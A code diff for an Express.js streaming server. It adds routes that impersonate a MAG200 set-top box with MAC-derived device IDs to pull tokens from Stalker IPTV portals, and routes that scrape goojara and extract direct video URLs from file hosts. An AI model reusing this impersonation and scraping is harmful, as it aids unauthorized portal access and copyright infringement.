+  const MAG200_UA = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3';
+  let token = '';
+
+  function buildMacCookies(tok) {
+    return [
+      `adid=${hwVersion}`, 'debug=1', `device_id2=${deviceId2}`, `device_id=${deviceId}`,
+      'hw_version=1.7-BD-00', `mac=${mac}`, `sn=${serialNum}`, 'stb_lang=en', 'timezone=America/Los_Angeles',
+      tok ? `token=${tok}` : '',
+    ].filter(Boolean).join('; ');
+  }
+
+  function proxyFetch(targetUrl, opts = {}) {
+    const mergedHeaders = {
+      'User-Agent': MAG200_UA, 'Accept': '*/*', 'Accept-Encoding': 'identity',
+      'Cookie': buildMacCookies(token),
+      ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
+      ...(opts.headers || {}),
+    };
+    return fetch(targetUrl, { ...opts, headers: mergedHeaders });
+  }
+
+  try {
+    const hsUrl = `${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`;
+    const hsRes = await proxyFetch(hsUrl, { signal: AbortSignal.timeout(15000) });
+    if (hsRes.ok) { const hsData = await hsRes.json(); token = hsData?.js?.token || ''; }
+
+    const pageNum = parseInt(page) || 0;
+    const seriesUrl = `${base}?type=series&action=get_ordered_list&category=${encodeURIComponent(category_id)}&JsHttpRequest=1-xml&p=${pageNum}`;
+    const seriesRes = await proxyFetch(seriesUrl, { signal: AbortSignal.timeout(15000) });
+    if (!seriesRes.ok) return res.status(502).json({ error: 'Failed to fetch Series list', status: seriesRes.status });
+
+    const seriesData = await seriesRes.json();
+    const totalItems = seriesData?.js?.total_items || 0;
+    const series = (seriesData?.js?.data || []).map(s => ({
+      id: s.id, name: s.name || s.title || 'Unknown',
+      cmd: s.cmd || '',
+      url: s.cmd || s.url || '',
+      logo: s.screenshot_uri || s.logo || '',
+      rating: s.rating || '',
+      genreName: s.genre || '',
+      year: s.year || '',
+      type: 'series',
+    }));
+
+    res.json({ series, totalItems, token, portal: base, mac, category_id, page: pageNum });
+  } catch (err) {
+    res.status(502).json({ error: 'Series list fetch failed', detail: err.message });
+  }
+});
+
+app.get('/api/stalker-series-seasons', async (req, res) => {
+  const { url: portalUrl, mac, series_id, page } = req.query;
+  if (!portalUrl) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!mac) return res.status(400).json({ error: 'Missing ?mac= parameter' });
+  if (!series_id) return res.status(400).json({ error: 'Missing ?series_id= parameter' });
+  const resolvedPortal = resolveStalkerPortal(portalUrl);
+  const base = resolvedPortal.apiUrl;
+  const serialNum = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+  const deviceId = crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase();
+  const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+  const hwVersion = crypto.createHash('sha1').update(mac).digest('hex');
+  const MAG200_UA = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3';
+  let token = '';
+
+  const buildMacCookies = (tok) => [
+    `adid=${hwVersion}`, 'debug=1', `device_id2=${deviceId2}`, `device_id=${deviceId}`,
+    'hw_version=1.7-BD-00', `mac=${mac}`, `sn=${serialNum}`, 'stb_lang=en', 'timezone=America/Los_Angeles',
+    tok ? `token=${tok}` : '',
+  ].filter(Boolean).join('; ');
+
+  const proxyFetch = (targetUrl, opts = {}) => {
+    const headers = {
+      'User-Agent': MAG200_UA,
+      'Accept': '*/*',
+      'Accept-Encoding': 'identity',
+      'Cookie': buildMacCookies(token),
+      ...(token ? { 'Authorization': `Bearer ${token}` } : {}),
+      ...(opts.headers || {}),
+    };
+    return fetch(targetUrl, { ...opts, headers });
+  };
+
+  try {
+    const hsRes = await proxyFetch(`${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`, { signal: AbortSignal.timeout(15000) });
+    if (hsRes.ok) {
+      const hsData = await hsRes.json();
+      token = hsData?.js?.token || '';
+    }
+
+    const pageNum = parseInt(page) || 0;
+    const seasonsUrl = `${base}?type=series&action=get_ordered_list&movie_id=${encodeURIComponent(series_id)}&season_id=0&episode_id=0&JsHttpRequest=1-xml&p=${pageNum}`;
+    const seasonsRes = await proxyFetch(seasonsUrl, { signal: AbortSignal.timeout(15000) });
+    if (!seasonsRes.ok) return res.status(502).json({ error: 'Failed to fetch Series seasons', status: seasonsRes.status });
+
+    const seasonsData = await seasonsRes.json();
+    const totalItems = seasonsData?.js?.total_items || 0;
+    const seasons = (seasonsData?.js?.data || []).map((season, idx) => {
+      const id = String(season.id || '');
+      const parsed = id.match(/^season(\d+)/i)?.[1] || id.match(/^\d+:(\d+)/)?.[1] || season.season_number || idx + 1;
+      const seasonNumber = parseInt(parsed, 10) || idx + 1;
+      const episodeNumbers = Array.isArray(season.series) ? season.series : [];
+      return {
+        ...season,
+        id,
+        name: season.name || season.title || `Season ${seasonNumber}`,
+        cmd: season.cmd || '',
+        url: season.cmd || '',
+        seriesId: series_id,
+        seasonNumber,
+        episodeNumbers,
+        type: 'series',
+        item_type: 'season',
+      };
+    }).sort((a, b) => (a.seasonNumber || 0) - (b.seasonNumber || 0));
+
+    const episodes = [];
+    seasons.forEach(season => {
+      (season.episodeNumbers || []).forEach(ep => {
+        episodes.push({
+          id: `${series_id}:${season.seasonNumber}:${ep}`,
+          name: `${season.name || `Season ${season.seasonNumber}`} Episode ${ep}`,
+          cmd: season.cmd || '',
+          url: season.cmd || '',
+          seriesId: series_id,
+          seasonNumber: season.seasonNumber,
+          episodeNumber: ep,
+          type: 'series',
+          item_type: 'episode',
+        });
+      });
+    });
+
+    res.json({ seasons, episodes, totalItems, token, portal: base, mac, series_id, page: pageNum });
+  } catch (err) {
+    res.status(502).json({ error: 'Series seasons fetch failed', detail: err.message });
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/goojara — Scrape goojara.to for streaming links
+//  ?title=<movie title>&type=<movie|tv>&year=<year>
+//  Returns: array of {source, type, url} for all found embed links
+//  Also returns cover art URL from md.goojara.to CDN
+// ═══════════════════════════════════════════
+app.get('/api/goojara', async (req, res) => {
+  const { title = '', type = 'movie', year = '' } = req.query;
+  if (!title) return res.status(400).json({ error: 'Missing ?title= parameter' });
+
+  const cacheKey = `goojara:${title}:${type}:${year}`;
+  const cached = getCached(cacheKey);
+  if (cached) return res.json(cached);
+
+  const result = { title, type, slug: null, coverUrl: null, streams: [], imdbId: null };
+
+  try {
+    // 1. Search goojara for the movie/series
+    const searchPath = type === 'tv' ? 'watch-series' : 'watch-movies';
+    const searchUrl = `https://ww1.goojara.to/${searchPath}`;
+    const searchRes = await fetch(searchUrl, {
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+        'Accept': 'text/html,*/*',
+      },
+      signal: AbortSignal.timeout(10000),
+    });
+    if (!searchRes.ok) throw new Error(`Search returned ${searchRes.status}`);
+    const searchHtml = await searchRes.text();
+
+    // Parse movie links: <a href="https://ww1.goojara.to/mXXXXXX" ...>Title (Year)</a>
+    const titleLower = title.toLowerCase().replace(/[^a-z0-9\s]/g, '');
+    const titleWords = titleLower.split(/\s+/).filter(w => w.length > 2);
+    const linkRegex = /<a[^>]*href="(https?:\/\/ww\d*\.goojara\.to\/[mt][a-zA-Z0-9]+)"[^>]*>([^<]*(?:<[^>]+>[^<]*)*)<\/a>/gi;
+    let match, bestSlug = null, bestScore = 0;
+
+    while ((match = linkRegex.exec(searchHtml)) !== null) {
+      const href = match[1];
+      const text = match[2].replace(/<[^>]+>/g, '').trim().toLowerCase();
+      const slug = href.replace(/^https?:\/\/[^/]+/, '').replace(/^\//, '');
+      // Score: how well does this match our title?
+      let score = 0;
+      for (const word of titleWords) {
+        if (text.includes(word)) score += 10;
+      }
+      if (year && text.includes(year)) score += 5;
+      if (score > bestScore) {
+        bestScore = score;
+        bestSlug = slug;
+      }
+    }
+
+    if (!bestSlug) {
+      // Try with goojara paging if not found on first page
+      for (let page = 2; page <= 3 && !bestSlug; page++) {
+        try {
+          const pageUrl = `${searchUrl}-popular/${page}`;
+          const pageRes = await fetch(pageUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            signal: AbortSignal.timeout(8000),
+          });
+          if (!pageRes.ok) continue;
+          const pageHtml = await pageRes.text();
+          while ((match = linkRegex.exec(pageHtml)) !== null) {
+            const href = match[1];
+            const text = match[2].replace(/<[^>]+>/g, '').trim().toLowerCase();
+            const slug = href.replace(/^https?:\/\/[^/]+/, '').replace(/^\//, '');
+            let score = 0;
+            for (const word of titleWords) { if (text.includes(word)) score += 10; }
+            if (year && text.includes(year)) score += 5;
+            if (score > bestScore) { bestScore = score; bestSlug = slug; }
+          }
+        } catch {}
+      }
+    }
+
+    if (!bestSlug) {
+      result.streams = [];
+      setCache(cacheKey, result);
+      return res.json(result);
+    }
+
+    result.slug = bestSlug;
+
+    // 2. Fetch the movie/show page to get cover art and stream links
+    const pageUrl = `https://ww1.goojara.to/${bestSlug}`;
+    const pageRes = await fetch(pageUrl, {
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+        'Accept': 'text/html,*/*',
+      },
+      signal: AbortSignal.timeout(10000),
+    });
+    if (!pageRes.ok) throw new Error(`Page fetch returned ${pageRes.status}`);
+    const pageHtml = await pageRes.text();
+
+    // Extract cover art URL from md.goojara.to CDN
+    const imgMatch = pageHtml.match(/src="(https?:\/\/md\.goojara\.to\/[^"']+\.jpg)"/);
+    if (imgMatch) result.coverUrl = imgMatch[1];
+
+    // Extract IMDB ID
+    const imdbMatch = pageHtml.match(/imdb\.com\/title\/(tt\d+)/i);
+    if (imdbMatch) result.imdbId = imdbMatch[1];
+
+    // 3. Extract direct stream links (a.bcg links → go.php redirects)
+    const bcgRegex = /<a\s+class="bcg"\s+href="([^"]+)"[^>]*>([^<]*(?:<[^>]+>[^<]*)*)<\/a>/gi;
+    let bcgMatch;
+    const seenSources = new Set();
+    while ((bcgMatch = bcgRegex.exec(pageHtml)) !== null) {
+      const rawUrl = bcgMatch[1];
+      const label = bcgMatch[2].replace(/<[^>]+>/g, '').trim().toLowerCase();
+      let sourceType = 'unknown';
+      if (label.includes('wootly')) sourceType = 'wootly';
+      else if (label.includes('luluvdo')) sourceType = 'luluvdo';
+      else if (label.includes('dood')) sourceType = 'dood';
+      else if (label.includes('vidsrc')) sourceType = 'vidsrc';
+
+      const sourceKey = `${sourceType}_${rawUrl}`;
+      if (!seenSources.has(sourceKey)) {
+        seenSources.add(sourceKey);
+        result.streams.push({
+          source: sourceType,
+          label: label,
+          goUrl: rawUrl,
+          resolvedUrl: null,
+        });
+      }
+    }
+
+    // 4. Look for the auto-loaded iframe (wootly embed from page JS)
+    const iframeMatch = pageHtml.match(/<iframe[^>]+src="(https?:\/\/web\.wootly\.ch\/[^"]+)"/i);
+    if (iframeMatch) {
+      result.streams.unshift({
+        source: 'wootly_auto',
+        label: 'wootly auto',
+        goUrl: null,
+        resolvedUrl: iframeMatch[1],
+      });
+    }
+
+    setCache(cacheKey, result);
+    res.json(result);
+  } catch (err) {
+    console.error(`[GOOJARA] Error scraping ${title}:`, err.message);
+    res.json({ ...result, error: 'Scraping failed' });
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/goojara-resolve — Resolve a go.php redirect
+//  ?url=<go.php base64 URL>
+//  Follows the redirect and returns the final destination URL
+// ═══════════════════════════════════════════
+app.get('/api/goojara-resolve', async (req, res) => {
+  const { url } = req.query;
+  if (!url) return res.status(400).json({ error: 'Missing ?url= parameter' });
+  if (!isUrlAllowed(url)) return res.status(403).json({ error: 'Blocked: URL targets private/internal network' });
+
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 10000);
+
+    const upstream = await fetch(url, {
+      signal: controller.signal,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+        'Accept': 'text/html,*/*',
+        'Referer': 'https://ww1.goojara.to/',
+      },
+      redirect: 'manual', // Don't auto-follow — we want to see each redirect
+    });
+    clearTimeout(timeout);
+
+    // Check for redirect
+    const status = upstream.status;
+    if (status >= 300 && status < 400) {
+      const location = upstream.headers.get('location') || '';
+      return res.json({ status, redirectUrl: location, finalUrl: location });
+    }
+
+    // If not a redirect, return what we got
+    const body = await upstream.text();
+    // Try to find iframe src or video URL in the response
+    const iframeSrc = body.match(/<iframe[^>]+src="([^"]+)"/)?.[1] || '';
+    const videoSrc = body.match(/<video[^>]+src="([^"]+)"/)?.[1] || body.match(/src="(https?:\/\/[^"]+\.m3u8[^"]*)"/)?.[1] || '';
+
+    res.json({
+      status,
+      redirectUrl: null,
+      finalUrl: iframeSrc || videoSrc || url,
+      iframeSrc,
+      videoSrc,
+      bodyLength: body.length,
+    });
+  } catch (err) {
+    console.error(`[GOOJARA-RESOLVE] Error: ${err.message}`);
+    res.status(502).json({ error: 'Failed to resolve URL', detail: 'Request failed' });
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/flix-ai-log — Markdown scraping log
+// ═══════════════════════════════════════════
+app.get('/api/flix-ai-log', (req, res) => {
+  const logFile = path.join(__dirname, 'data', 'flix-ai-log.md');
+  try {
+    const md = fs.readFileSync(logFile, 'utf8');
+    res.type('text/markdown').send(md);
+  } catch {
+    res.type('text/markdown').send('# flix-AI Scraping Log\n\nNo runs yet.\n');
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/flix-ai-brain — AI learning results
+// ═══════════════════════════════════════════
+app.get('/api/flix-ai-brain', (req, res) => {
+  const brainFile = path.join(__dirname, 'data', 'flix-ai-brain.json');
+  try {
+    const data = JSON.parse(fs.readFileSync(brainFile, 'utf8'));
+    res.json(data);
+  } catch {
+    res.json({ version: 1, learnCount: 0, sourceReliability: {}, genreRankings: [], predictions: {}, franchisePairs: {} });
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/flix-ai-log — Markdown scraping run log
+// ═══════════════════════════════════════════
+app.get('/api/flix-ai-log', (req, res) => {
+  const logFile = path.join(__dirname, 'data', 'flix-ai-log.md');
+  try {
+    const md = fs.readFileSync(logFile, 'utf8');
+    res.type('text/markdown').send(md);
+  } catch {
+    res.type('text/markdown').send('# flix-AI Scraping Log\n\nNo runs yet.\n');
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/flix-ai-status — flix-AI agent current status
+// ═══════════════════════════════════════════
+app.get('/api/flix-ai-status', (req, res) => {
+  const statusFile = path.join(__dirname, 'data', 'flix-ai-status.json');
+  try {
+    const data = JSON.parse(fs.readFileSync(statusFile, 'utf8'));
+    res.json(data);
+  } catch {
+    res.json({ agent: 'flix-AI', status: 'never_run', lastRun: null });
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/flix-ai-results — Cached flix-AI results
+//  ?franchise=<name> to filter by franchise group
+//  ?imdb=<ttXXXX> to look up a specific title's streams
+// ═══════════════════════════════════════════
+app.get('/api/flix-ai-results', (req, res) => {
+  const cacheFile = path.join(__dirname, 'data', 'flix-ai-cache.json');
+  let data;
+  try {
+    data = JSON.parse(fs.readFileSync(cacheFile, 'utf8'));
+  } catch {
+    return res.json({ agent: 'flix-AI', error: 'No scrape data yet', lastRun: null, franchises: {}, items: {} });
+  }
+
+  const { franchise, imdb } = req.query;
+  if (franchise && data.franchises[franchise]) {
+    const fr = data.franchises[franchise];
+    const items = {};
+    for (const idKey of fr.items || []) {
+      if (data.items[idKey]) items[idKey] = data.items[idKey];
+    }
+    return res.json({ agent: 'flix-AI', franchise, type: fr.type, lastChecked: fr.lastChecked, items });
+  }
+
+  if (imdb) {
+    const results = { agent: 'flix-AI', imdb, found_in: [], streams: {} };
+    for (const [fname, fr] of Object.entries(data.franchises || {})) {
+      if (fr.items?.includes(imdb)) results.found_in.push(fname);
+    }
+    if (data.items[imdb]) results.streams = data.items[imdb];
+    for (const [k, v] of Object.entries(data.items || {})) {
+      if (k.startsWith(imdb) && k !== imdb) results.streams[k] = v;
+    }
+    return res.json(results);
+  }
+
+  // Summary
+  const summary = { agent: 'flix-AI', lastRun: data.lastRun, totalFranchises: Object.keys(data.franchises || {}).length, totalItems: Object.keys(data.items || {}).length, franchises: {} };
+  for (const [name, fr] of Object.entries(data.franchises || {})) {
+    summary.franchises[name] = { type: fr.type, itemCount: (fr.items || []).length, lastChecked: fr.lastChecked };
+  }
+  res.json(summary);
+});
+
+// ═══════════════════════════════════════════
+//  /api/scrape-status — Current scraper run status
+// ═══════════════════════════════════════════
+app.get('/api/scrape-status', (req, res) => {
+  const statusFile = path.join(__dirname, 'data', 'scrape-status.json');
+  try {
+    const data = JSON.parse(fs.readFileSync(statusFile, 'utf8'));
+    res.json(data);
+  } catch {
+    res.json({ status: 'never_run', lastRun: null });
+  }
+});
+
+// ═══════════════════════════════════════════
+//  /api/scrape-results — Cached stream results from scraper
+//  ?franchise=<name> to filter by franchise
+//  ?imdb=<ttXXXX> to look up a specific title
+// ═══════════════════════════════════════════
+app.get('/api/scrape-results', (req, res) => {
+  const cacheFile = path.join(__dirname, 'data', 'stream-cache.json');
+  let data;
+  try {
+    data = JSON.parse(fs.readFileSync(cacheFile, 'utf8'));
+  } catch {
+    return res.json({ error: 'No scrape data yet', lastRun: null, franchises: {}, checked: {} });
+  }
+
+  const { franchise, imdb } = req.query;
+  if (franchise && data.franchises[franchise]) {
+    // Return franchise group — movies kept together
+    const fr = data.franchises[franchise];
+    const items = {};
+    for (const idKey of fr.items || []) {
+      if (data.checked[`${idKey}_${fr.type}`]) {
+        items[idKey] = data.checked[`${idKey}_${fr.type}`];
+      }
+    }
+    return res.json({
+      franchise,
+      type: fr.type,
+      lastChecked: fr.lastChecked,
+      items,
+    });
+  }
+
+  if (imdb) {
+    // Look up specific IMDB ID across all franchises
+    const results = { imdb, found_in: [], streams: [] };
+    for (const [fname, fr] of Object.entries(data.franchises || {})) {
+      if (fr.items?.includes(imdb)) {
+        results.found_in.push(fname);
+      }
+    }
+    for (const [key, val] of Object.entries(data.checked || {})) {
+      if (key.startsWith(imdb)) {
+        results.streams.push(val);
+      }
+    }
+    return res.json(results);
+  }
+
+  // Return summary of all franchises
+  const summary = {
+    lastRun: data.lastRun,
+    totalFranchises: Object.keys(data.franchises || {}).length,
+    totalChecked: Object.keys(data.checked || {}).length,
+    franchises: {},
+  };
+  for (const [name, fr] of Object.entries(data.franchises || {})) {
+    summary.franchises[name] = {
+      type: fr.type,
+      itemCount: (fr.items || []).length,
+      lastChecked: fr.lastChecked,
+    };
+  }
+  res.json(summary);
+});
+
+// ═══════════════════════════════════════════
+//  /api/stream — Resolve a movie/show to direct stream URLs
+//  ?imdb=tt1190634&type=tv&s=1&e=1
+//  Chain: Find on Goojara → episode page → go.php links → video host → .mp4/.m3u8
+//  Returns all working direct stream URLs (no ads, no redirects, no iframes)
+// ═══════════════════════════════════════════
+app.get('/api/stream', async (req, res) => {
+  const { imdb, type = 'tv', s: season = 1, e: episode = 1 } = req.query;
+  if (!imdb) return res.status(400).json({ error: 'Missing ?imdb= parameter (e.g. tt1190634)' });
+
+  const cacheKey = `stream:${imdb}:${type}:${season}:${episode}`;
+  const cached = getCached(cacheKey);
+  if (cached) return res.json(cached);
+
+  const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36';
+  const result = { imdb, type, season: +season, episode: +episode, streams: [] };
+
+  try {
+    // ── STEP 1: Find the show on Goojara ──
+    const searchPath = type === 'tv' ? 'watch-series' : 'watch-movies';
+    const searchUrl = `https://ww1.goojara.to/${searchPath}`;
+    const searchRes = await fetch(searchUrl, {
+      headers: { 'User-Agent': UA, 'Accept': 'text/html,*/*' },
+      signal: AbortSignal.timeout(10000),
+    });
+    if (!searchRes.ok) throw new Error(`Search returned ${searchRes.status}`);
+    const searchHtml = await searchRes.text();
+
+    // Goojara episode links: href="https://ww1.goojara.to/e5Q7Pq" title="The Boys (5.8)"
+    // Also: href="https://www.goojara.to/e5Q7Pq" title="The Boys (S5, Ep8)"
+    const epRegex = /href="(https?:\/\/(?:ww\d+\.|www\.)goojara\.to\/[a-zA-Z0-9]{5,8})"[^>]*title="([^"]+)"/gi;
+    let m, bestHref = null, bestTitle = null;
+
+    // Build a title from IMDB ID - try Cinemeta first
+    let showTitle = '';
+    try {
+      const metaRes = await fetch(`https://v3-cinemeta.strem.io/meta/${type}/${imdb}.json`, {
+        headers: { 'User-Agent': UA },
+        signal: AbortSignal.timeout(5000),
+      });
+      if (metaRes.ok) {
+        const meta = await metaRes.json();
+        showTitle = meta?.meta?.name || '';
+      }
+    } catch {}
+
+    // Search for matching episode links
+    const titleWords = showTitle.toLowerCase().replace(/[^a-z0-9\s]/g, '').split(/\s+/).filter(w => w.length > 2);
+    const targetEp = `${season}.${episode}`;
+    const targetEpAlt = `S${season}, Ep${episode}`;
+
+    while ((m = epRegex.exec(searchHtml)) !== null) {
+      const href = m[1];
+      const title = m[2];
+      const titleLower = title.toLowerCase();
+      const hasTitle = titleWords.length === 0 || titleWords.every(w => titleLower.includes(w));
+      const hasEp = titleLower.includes(targetEp) || titleLower.includes(targetEpAlt.toLowerCase());
+      if (hasTitle && hasEp) {
+        bestHref = href;
+        bestTitle = title;
+        break;
+      }
+    }
+
+    // If not found, try partial match on title + look through more pages
+    if (!bestHref && titleWords.length > 0) {
+      epRegex.lastIndex = 0; // reset regex
+      while ((m = epRegex.exec(searchHtml)) !== null) {
+        const href = m[1];
+        const title = m[2];
+        const titleLower = title.toLowerCase();
+        const matchScore = titleWords.filter(w => titleLower.includes(w)).length;
+        if (matchScore >= Math.ceil(titleWords.length / 2)) {
+          const hasEp = titleLower.includes(targetEp) || titleLower.includes(targetEpAlt.toLowerCase());
+          if (hasEp) {
+            bestHref = href;
+            bestTitle = title;
+            break;
+          }
+          // If matching show but different episode, follow to get the show page then navigate to the right episode
+          if (!bestHref) {
+            bestHref = href;
+            bestTitle = title;
+          }
+        }
+      }
+    }
+
+    if (!bestHref) {
+      result.error = 'Not found on Goojara';
+      setCache(cacheKey, result, 300000); // cache 5 min
+      return res.json(result);
+    }
+
+    // ── STEP 2: Fetch the episode page ──
+    const epPageRes = await fetch(bestHref, {
+      headers: { 'User-Agent': UA, 'Accept': 'text/html,*/*' },
+      signal: AbortSignal.timeout(10000),
+    });
+    if (!epPageRes.ok) throw new Error(`Episode page returned ${epPageRes.status}`);
+    const epHtml = await epPageRes.text();
+
+    // ── STEP 3: Extract all go.php links ──
+    const goRegex = /href="(https?:\/\/ww\d+\.goojara\.to\/go\.php\?url=[^"]+)"/gi;
+    const labelRegex = /<a[^>]*href="[^"]*go\.php[^"]*"[^>]*>([^<]*(?:<[^>]+>[^<]*)*)<\/a>/gi;
+    const links = [];
+    let lm;
+    while ((lm = labelRegex.exec(epHtml)) !== null) {
+      const labelText = lm[1].replace(/<[^>]+>/g, '').trim().toLowerCase();
+      const hrefMatch = lm[0].match(/href="([^"]+)"/);
+      if (hrefMatch) {
+        let sourceType = 'unknown';
+        if (labelText.includes('wootly')) sourceType = 'wootly';
+        else if (labelText.includes('luluvdo')) sourceType = 'luluvdo';
+        else if (labelText.includes('dood')) sourceType = 'dood';
+        else if (labelText.includes('streamplay')) sourceType = 'streamplay';
+        else if (labelText.includes('vidsrc')) sourceType = 'vidsrc';
+        else if (labelText.includes('opus') || labelText.includes('av1')) sourceType = 'av1';
+        links.push({ url: hrefMatch[1], label: labelText, source: sourceType });
+      }
+    }
+
+    // ── STEP 4: Resolve each go.php link → get video host URL ──
+    // Prioritize: streamplay > luluvdo > dood > vidsrc > wootly > av1
+    const priority = ['streamplay', 'luluvdo', 'dood', 'vidsrc', 'wootly', 'av1', 'unknown'];
+    links.sort((a, b) => priority.indexOf(a.source) - priority.indexOf(b.source));
+
+    // Resolve top links (limit to 5 to avoid timeout)
+    const toResolve = links.slice(0, 5);
+
+    for (const link of toResolve) {
+      try {
+        const resolveRes = await fetch(link.url, {
+          headers: {
+            'User-Agent': UA,
+            'Accept': 'text/html,*/*',
+            'Referer': 'https://ww1.goojara.to/',
+          },
+          redirect: 'manual',
+          signal: AbortSignal.timeout(8000),
+        });
+
+        let finalUrl = null;
+        const status = resolveRes.status;
+
+        // Follow redirects up to 3 hops
+        if (status >= 300 && status < 400) {
+          let loc = resolveRes.headers.get('location') || '';
+          for (let hop = 0; hop < 3 && loc; hop++) {
+            if (loc.startsWith('/')) loc = new URL(loc, link.url).href;
+            try {
+              const hopRes = await fetch(loc, {
+                headers: { 'User-Agent': UA, 'Referer': 'https://ww1.goojara.to/' },
+                redirect: 'manual',
+                signal: AbortSignal.timeout(8000),
+              });
+              if (hopRes.status >= 300 && hopRes.status < 400) {
+                loc = hopRes.headers.get('location') || '';
+                if (loc.startsWith('/')) loc = new URL(loc, link.url).href;
+              } else {
+                finalUrl = loc;
+                break;
+              }
+            } catch { break; }
+          }
+          if (!finalUrl && loc) finalUrl = loc;
+        } else {
+          // Try to find iframe or video in the body
+          const body = await resolveRes.text();
+          const iframeMatch = body.match(/<iframe[^>]+src="([^"]+)"/i);
+          const videoMatch = body.match(/<video[^>]+src="([^"]+)"/i) ||
+                             body.match(/src="([^"]+\.m3u8[^"]*)"/i) ||
+                             body.match(/src="([^"]+\.mp4[^"]*)"/i);
+          finalUrl = iframeMatch?.[1] || videoMatch?.[1] || null;
+        }
+
+        result.streams.push({
+          source: link.source,
+          label: link.label,
+          hostUrl: finalUrl,
+          status: finalUrl ? 'resolved' : 'pending',
+        });
+      } catch (err) {
+        console.error(`[STREAM] Link resolve error: ${err.message}`);
+        result.streams.push({
+          source: link.source,
+          label: link.label,
+          hostUrl: null,
+          status: 'error',
+          error: 'Link resolution failed',
+        });
+      }
+    }
+
+    // ── STEP 5: Try to extract direct .mp4/.m3u8 from each host URL ──
+    for (const stream of result.streams) {
+      if (!stream.hostUrl || stream.hostUrl.includes('opera.com') || stream.hostUrl.includes('survey')) {
+        stream.status = 'dead';
+        stream.directUrl = null;
+        continue;
+      }
+
+      try {
+        // Dood: https://dood.li/d/XXXXX → extract from /pass_md5/ API
+        if (stream.hostUrl.includes('dood')) {
+          const doodRes = await fetch(stream.hostUrl, {
+            headers: { 'User-Agent': UA },
+            redirect: 'follow',
+            signal: AbortSignal.timeout(10000),
+          });
+          const doodHtml = await doodRes.text();
+          const md5Match = doodHtml.match(/\/pass_md5\/([^"']+)/);
+          if (md5Match) {
+            const doodHost = new URL(stream.hostUrl).origin;
+            const passRes = await fetch(`${doodHost}/pass_md5/${md5Match[1]}`, {
+              headers: { 'User-Agent': UA, 'Referer': stream.hostUrl },
+              signal: AbortSignal.timeout(8000),
+            });
+            if (passRes.ok) {
+              const passToken = await passRes.text();
+              const token = passToken.match(/[^/]+$/)?.[0] || md5Match[1];
+              const directUrl = `${passToken}${token}?token=${token}`;
+              stream.directUrl = directUrl;
+              stream.status = 'live';
+            }
+          }
+        }
+        // Luluvdo: page contains JS with video URL
+        else if (stream.hostUrl.includes('luluvdo') || stream.hostUrl.includes('lulu')) {
+          const luluRes = await fetch(stream.hostUrl, {
+            headers: { 'User-Agent': UA },
+            redirect: 'follow',
+            signal: AbortSignal.timeout(10000),
+          });
+          const luluHtml = await luluRes.text();
+          // Look for .mp4 or .m3u8 in script tags
+          const vidUrl = luluHtml.match(/https?:\/\/[^"'\s]+\.m3u8[^"'\s]*/)?.[0] ||
+                         luluHtml.match(/https?:\/\/[^"'\s]+\.mp4[^"'\s]*/)?.[0] ||
+                         luluHtml.match(/source:\s*['"]([^'"]+)['"]/)?.[1] ||
+                         luluHtml.match(/file:\s*['"]([^'"]+)['"]/)?.[1] ||
+                         null;
+          if (vidUrl) {
+            stream.directUrl = vidUrl;
+            stream.status = 'live';
+          } else {
+            // Luluvdo might use a player API — pass the host URL as-is
+            stream.directUrl = stream.hostUrl;
+            stream.status = 'host';
+          }
+        }
+        // Streamplay: similar pattern
+        else if (stream.hostUrl.includes('streamplay')) {
+          const spRes = await fetch(stream.hostUrl, {
+            headers: { 'User-Agent': UA },
+            redirect: 'follow',
+            signal: AbortSignal.timeout(10000),
+          });
+          const spHtml = await spRes.text();
+          const vidUrl = spHtml.match(/https?:\/\/[^"'\s]+\.m3u8[^"'\s]*/)?.[0] ||
+                         spHtml.match(/https?:\/\/[^"'\s]+\.mp4[^"'\s]*/)?.[0] ||
+                         spHtml.match(/file:\s*['"]([^'"]+)['"]/)?.[1] ||
+                         null;
+          if (vidUrl) {
+            stream.directUrl = vidUrl;
+            stream.status = 'live';
+          } else {
+            stream.directUrl = stream.hostUrl;
+            stream.status = 'host';
+          }
+        }
+        // VidSrc embeds: already contain video player
+        else if (stream.hostUrl.includes('vidsrc')) {
+          stream.directUrl = stream.hostUrl;
+          stream.status = 'embed';
+        }
+        // Wootly: needs form POST, usually ads — skip
+        else if (stream.hostUrl.includes('wootly')) {
+          stream.directUrl = stream.hostUrl;
+          stream.status = 'host';
+        }
+        // Generic: try to find video URL in page
+        else {
+          try {
+            const genRes = await fetch(stream.hostUrl, {
+              headers: { 'User-Agent': UA },
+              redirect: 'follow',
+              signal: AbortSignal.timeout(8000),
+            });
+            const genHtml = await genRes.text();
